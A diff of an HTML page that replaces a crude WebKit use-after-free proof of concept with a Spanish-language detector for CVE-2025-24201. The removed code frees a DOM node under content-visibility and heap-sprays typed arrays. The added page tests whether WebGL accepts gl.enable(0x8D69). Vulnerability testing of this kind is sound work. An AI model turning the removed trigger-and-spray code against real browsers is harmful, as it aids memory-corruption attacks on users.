@@ -1,93 +1,97 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>WebKit UAF via content-visibility (Fixed)</title>
-    <style>
-        .container {
-            width: 200px;
-            height: 200px;
-        }
-        .child {
-            width: 100px;
-            height: 100px;
-            background-color: blue;
-            display: block;
-        }
-    </style>
-    <script>
-        function log(msg) {
-            document.body.innerHTML += msg + "<br>";
-        }
-
-        window.onload = () => {
-            log("Starting WebKit UAF PoC...");
-
-            const container = document.querySelector('.container');
-
-            // Wait until child is available
-            let child = document.querySelector('.child');
-            if (!child) {
-                log("Child not found, retrying...");
-                setTimeout(() => {
-                    child = document.querySelector('.child');
-                    if (!child) {
-                        log("Child still not found.");
-                        return;
-                    }
-                    startExploit(container, child);
-                }, 500);
-            } else {
-                startExploit(container, child);
-            }
-        };
-
-        function startExploit(container, child) {
-            log("Child found, starting exploit...");
-
-            // MutationObserver to re-trigger UAF
-            const observer = new MutationObserver(() => {
-                log("Mutation observed, re-triggering UAF...");
-                triggerUAF(container, child);
-            });
-
-            observer.observe(container, { childList: true });
-
-            triggerUAF(container, child);
-        }
-
-        function triggerUAF(container, child) {
-            try {
-                // Step 1: Set content-visibility to hidden
-                container.style.contentVisibility = 'hidden';
-
-                // Step 2: Remove child (freeing memory)
-                if (container.contains(child)) {
-                    container.removeChild(child);
-                }
-
-                // Step 3: Delay and restore visibility
-                setTimeout(() => {
-                    container.style.contentVisibility = 'auto';
-                    log("Restored content-visibility");
-                }, 100);
-
-                // Step 4: Heap spray to fill freed memory
-                window.spray = [];
-                for (let i = 0; i < 10000; i++) {
-                    window.spray.push(new Uint8Array(0x100));
-                }
-
-                log("Heap spray complete.");
-            } catch (e) {
-                log("Exception during UAF: " + e.message);
-            }
-        }
-    </script>
+  <meta charset="utf-8">
+  <title>Tester CVE‑2025‑24201 – WebKit</title>
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      font-family: system-ui, sans-serif;
+      background: #111;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 1rem;
+    }
+    #out {
+      font-size: 1.5rem;
+      padding: 1rem 2rem;
+      border-radius: 12px;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    #log {
+      max-width: 90vw;
+      width: 600px;
+      background: #222;
+      border: 1px solid #444;
+      padding: 1rem;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 0.9rem;
+      white-space: pre-wrap;
+      overflow: auto;
+      max-height: 45vh;
+    }
+    .bad   { background: #600; box-shadow: 0 0 12px #f33; }
+    .good  { background: #064; box-shadow: 0 0 12px #0f8; }
+    .info  { background: #333; box-shadow: 0 0 6px #888; }
+  </style>
 </head>
 <body>
-    <h2>WebKit UAF via content-visibility</h2>
-    <div class="container">
-        <div class="child"></div>
-    </div>
+
+<canvas id="c" style="display:none"></canvas>
+<div id="out" class="info">Ejecutando prueba…</div>
+<pre id="log"></pre>
+
+<script>
+(function () {
+  const log = (...msg) => {
+    console.log(...msg);
+    document.getElementById('log').textContent += msg.join(' ') + '\n';
+  };
+
+  const canvas = document.getElementById('c');
+  const out = document.getElementById('out');
+
+  log('[*] Intentando crear contexto WebGL...');
+  const gl = canvas.getContext("webgl");
+
+  if (!gl) {
+    log('[!] No se pudo crear el contexto WebGL.');
+    out.textContent = 'WebGL no disponible – getContext("webgl") retornó null';
+    out.className = 'good'; // sin WebGL, no hay riesgo
+    return;
+  }
+
+  log('[+] Contexto WebGL creado correctamente.');
+  const RESTART = 0x8D69;
+
+  // Limpia errores previos
+  let cleared = 0;
+  while (gl.getError() !== gl.NO_ERROR && cleared++ < 10);
+  log('[*] Limpieza previa de errores completada.');
+
+  log(`[*] Llamando a gl.enable(0x${RESTART.toString(16)})`);
+  gl.enable(RESTART);
+  const err = gl.getError();
+  log(`[*] gl.getError() devolvió: 0x${err.toString(16).padStart(4, '0')}`);
+
+  if (err === gl.NO_ERROR) {
+    out.textContent = 'VULNERABLE – gl.enable(0x8D69) no produjo error';
+    out.className = 'bad';
+    log('[!] Posible CVE-2025-24201 – ruta peligrosa activa');
+  } else {
+    out.textContent = 'Seguro – WebGL activo, pero el motor devolvió error';
+    out.className = 'good';
+    log('[+] El motor devolvió error como se esperaba – protección presente.');
+  }
+})();
+</script>
+
 </body>
 </html>
